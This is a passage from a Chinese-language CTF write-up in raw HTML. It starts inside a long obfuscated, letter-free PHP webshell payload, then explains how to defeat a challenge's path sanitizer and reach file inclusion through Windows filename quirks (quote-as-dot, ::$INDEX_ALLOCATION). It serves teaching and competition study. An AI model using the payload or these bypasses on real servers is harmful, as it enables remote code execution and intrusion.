++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_____=$__?&gt;&lt;?=$__=&#39;&#39;?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=&#34;.&#34;?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_____($__)?&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>不过他们可能搞错了，这里他们本意想用<code>&lt;?=?></code>来绕过<code>;</code>限制，但是其实<code>;</code>并没有过滤&mldr;</p><p>最后一步可以说有了，我们来看看前几步，<code>Put</code>类的<code>__construct</code>有一个<code>path_sanitizer</code>，我们可以看到有一些检查什么的，没有<code>false</code>的情况是不会过滤<code>/</code>的，这里初始化的时候不会过滤<code>/</code>。</p><p>所以如果我们在写文件的时候，用<code>put&amp;test/test</code>去写<code>test</code>目录<code>test</code>文件，<code>file_put_contents</code>会因为<code>test</code>目录不存在而写不进去。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file_put_contents(./test/test): failed to open stream: No such file or directory
</span></span></code></pre></td></tr></table></div></div><p>那如果我们直接写进一个<code>test</code>文件呢？写是没有问题的，但是我们在用<code>get</code>路由读的时候就会发生问题了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>get</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>===</span> <span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;blocked by path sanitizer&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// wtf???? //
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span><span class=p>(</span><span class=o>!@</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=c1>// index files are *completely* disabled. //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=s2>&#34;index&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;you cannot include index files!&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// hardened sanitizer spawned. thus we sense ambiguity //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$read_file</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$read_file_with_hardened_filter</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nx>path_sanitizer</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$read_file</span> <span class=o>===</span> <span class=nv>$read_file_with_hardened_filter</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>       <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file</span><span class=p>)</span> <span class=o>===</span> <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file_with_hardened_filter</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;request blocked&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// .. and finally, include *un*exploitable file is included. //
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>@</span><span class=k>include</span><span class=p>(</span><span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;success&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;invalid filename (wtf)&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>我们仔细看这段代码，由于<code>path_sanitizer</code>传入了<code>true</code>，这里会把传入的文件名当中<code>/</code>过滤为空，然后有一个比较，如果直接拼接得到的路径与拼接上过滤之后得到的路径相等的话，会进一步比较他们的文件内容，如果相等的话就会被 block &mldr;而我们要进行 include ，那就需要绕过这两个判断&mldr;</p><p>什么个意思呢？就是即使文件名相等，内容也不能相等。</p><p>但是我们这里要注意<code>path_sanitizer</code>，如果我们传入一个含有<code>/</code>的文件名那就可以利用这个方法绕过文件名的判断，直接进行包含了。</p><p>而题目环境我们可以由一开始的 phpinfo 得到是一个 windows 的环境（虽然赛场是没有的，但是也可以通过各种方法判断一下，比如 nmap 啥的&mldr;）</p><p>所以我们现在主要就是绕读写文件这一块了。</p><h3 id=trick-1>Trick 1</h3><blockquote><p>​ 对于Windows的文件读取，有一个小 Trick ：使用<code>FindFirstFile</code>这个API的时候，其会把<code>"</code>解释为<code>.</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>shell&#34;php === shell.php		//true
</span></span></code></pre></td></tr></table></div></div></blockquote><p>所以我们可以利用这个 trick ，来构造文件名为<code>"/test</code>的文件，什么个意思呢？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$read_file</span> <span class=o>=</span> <span class=s2>&#34;./files/./test&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$read_file_with_hardened_filter</span> <span class=o>=</span> <span class=s2>&#34;./files/.test&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file</span><span class=p>)</span> <span class=o>=</span> <span class=s1>&#39;实际文件内容&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file_with_hardened_filter</span><span class=p>)</span> <span class=o>=</span> <span class=k>false</span> <span class=c1>//文件不存在
</span></span></span></code></pre></td></tr></table></div></div><p>传入的<code>"/test</code>文件名，由于这个 trick ，会被 Windows 认为是<code>./test</code>，所以在处理这个方式上就产生了差异也就绕过了两个判断</p><h3 id=trick-2>Trick 2</h3><p>可以参考 <a class=link href=https://c1h3ng.github.io/web/2018/06/19/windows-tricks/ target=_blank rel=noopener>windows的一些特性</a> 这篇文章，文章最后告诉我们，可以上传一个文件名为<code>test::$INDEX_ALLOCATION</code>的文件，就相当于创建了一个<code>test</code>的文件夹，详细原理可以看该篇文章。</p><p>这样我们就可以先用这个 Trick 创建一个文件夹<code>test</code>，然后用<code>put</code>随意写一个文件<code>test/file</code>，在读取的时候，由于<code>path_sanitizer</code>会把我们的<code>/</code>过滤，就成功绕过了文件名的判断了。绕过了这些就只剩下无字母写 webshell 的问题了。</p><h2 id=noxss>noxss</h2><p>单独为这道题开一篇文章来写，真的tql&mldr;</p><h2 id=tfboys>tfboys</h2><p>机器学习的题目，表示不会&mldr;地址在 <a class=link href=https://github.com/Xyntax/XCTF-2019-tfboys target=_blank rel=noopener>XCTF-2019-tfboys</a></p><h1 id=conclusion>Conclusion</h1><p>体验极其好的一次比赛，非常感谢 @r3kapig 师傅们的精心准备，毫不夸张地说，这是本年度体验最好的一场比赛，无论从题目质量或者是从比赛过程的体验，都是非常棒的。希望国内以后更多一些这类的良心比赛！</p><p><img src=https://blogpic.zdy.one/img/20191113235515.jpeg loading=lazy></p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><br><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://zeddyu.github.io/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p></div></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/writeup-for-a-more-secure-pastebin-practical-timeless-timing-in-browser/><div class=article-details><h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2></div></a></article><article><a href=/p/hxp-ctf-2021-the-end-of-lfi/><div class=article-details><h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2></div></a></article><article><a href=/p/hxp-ctf-2021-a-new-novel-lfi/><div class=article-details><h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2></div></a></article><article><a href=/p/writeup-for-web-checkin-in-cybrics-ctf-2021-mirror/><div class=article-details><h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2></div></a></article><article><a href=/p/two-webs-writeup-in-google-ctf-quals-2021/><div class=article-details><h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=ZeddYu/ZeddYu.github.io data-repo-id="MDEwOlJlcG9zaXRvcnkzMzgyODQ1OTY=" data-category=Announcements data-category-id=DIC_kwDOFCnQNM4ClsKy data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading=lazy crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.zdy.one/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///ts/main.js defer integrity="sha256-Hpo7r9hGztTDRdCEs1X7jHuudXAcM4+KH4qCx4ATeCY=" crossorigin=anonymous></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("https://zeddyu.github.io/sw.min.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)},function(e){console.log("ServiceWorker registration failed: ",e)})})</script><script type=speculationrules>
{
        "prefetch": [
            {
                "source": "document",
                "eagerness": "moderate"
            }
        ],
        "prerender": [
            {
                "urls": ["/about", "/archives", "/ads", "/categories", "/links", "/search"],
                "eagerness": "eager"
            }
        ]
    }
</script></body></html>